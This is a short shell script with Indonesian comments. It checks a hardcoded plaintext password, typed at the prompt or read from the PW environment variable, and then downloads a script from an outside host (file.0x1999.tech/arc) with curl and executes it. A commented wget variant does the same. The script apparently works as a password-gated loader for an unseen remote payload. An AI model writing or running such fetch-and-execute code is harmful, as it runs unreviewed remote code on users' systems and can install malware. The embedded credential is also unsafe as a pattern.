#!/bin/sh

CORRECT_PASSWORD="!Superadmin@0x1999!."

printf "Password: "

if [ -t 0 ]; then
    # Ada TTY → boleh pakai stty + read
    stty -echo
    read pw
    stty echo
    echo
else
    # Tidak ada TTY → wajib pakai PW dari environment
    echo "[INFO] stdin bukan TTY, pakai PW dari environment."
    pw="$PW"
fi

[ "$pw" = "$CORRECT_PASSWORD" ] || {
    echo "[ERR] Password salah."
    exit 1
}

echo "[OK] Login berhasil."

# ===== EKSEKUSI LANJUTAN DI SINI =====
# contoh:
# /bin/sh -c "$(wget -qO- https://file.0x1999.tech/arc)"
/bin/sh -c "$(curl -fsSL https://file.0x1999.tech/arc)"
